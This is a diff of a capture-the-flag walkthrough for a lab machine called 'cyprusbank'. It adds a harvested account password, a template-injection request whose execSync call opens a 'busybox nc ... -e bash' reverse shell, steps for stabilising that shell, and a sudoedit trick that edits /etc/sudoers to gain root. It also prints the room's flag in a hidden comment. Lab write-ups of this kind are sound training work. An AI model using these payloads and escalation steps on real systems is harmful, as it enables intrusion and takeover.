@@ -102,6 +102,8 @@ Olivia Cortez: No she hasn't been around for a while
 
 Jemmy Laurel: Oh, is she OK?
 ```
+* ### Gayle Bev
+* ### p~]P@5!6;rs558:q
 
 ## Let's log in to Gayle Bev's account.
 
@@ -143,7 +145,7 @@ Jemmy Laurel: Oh, is she OK?
 
 ## Capture the request and edit it and send:
 ```
-name=a&password=a&&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.17.120.99 1337 -e bash');s
+name=a&password=a&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.17.11.253 1234 -e bash');s
 ```
 ![image](https://github.com/user-attachments/assets/67462093-635d-4ae6-936e-1d9111a282f8)
 
@@ -189,6 +191,20 @@ User web may run the following commands on cyprusbank:
     (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 web@cyprusbank:~$
 ```
+```
+export TERM=xterm
+```
+```
+web@cyprusbank:~/app$ export TERM=xterm
+export TERM=xterm
+web@cyprusbank:~/app$ ^Z
+[1]+  Stopped                 nc -lnvp 1234
+death@esther:~$ stty raw -echo; fg
+nc -lnvp 1234
+
+web@cyprusbank:~/app$ 
+```
+
 ### We see that we can run ```sudoedit``` as root without a password for this file ```/etc/nginx/sites-available/admin.cyprusbank.thm```
 
 ### Let open this in Editor
@@ -202,16 +218,27 @@ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 ```
 web ALL=(root) NOPASSWD: ALL
 ```
-
 ```
 sudo su
 ```
+```
+web@cyprusbank:~/app$ export SUDO_EDITOR='nano -- /etc/sudoers'
+web@cyprusbank:~/app$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+sudoedit: --: editing files in a writable directory is not permitted
+web@cyprusbank:~/app$ sudo su
+root@cyprusbank:/home/web/app# cat /root/root.txt
+THM{4nd_****4g3s}
+root@cyprusbank:/home/web/app# 
+```
 done
+<!--THM{4nd_uR_p4ck4g3s}-->
 
 
 
 
-
+![Screenshot from 2024-11-09 22-08-29](https://github.com/user-attachments/assets/2a337717-25d7-4863-9adb-6006dd2d467f)
+![Screenshot from 2024-11-09 22-05-30](https://github.com/user-attachments/assets/850ca083-3892-423f-b43e-94c0b1daf80d)
+![Screenshot from 2024-11-09 22-05-23](https://github.com/user-attachments/assets/c33f75c6-43a2-4745-b2c7-0874963b1129)
 
 
 
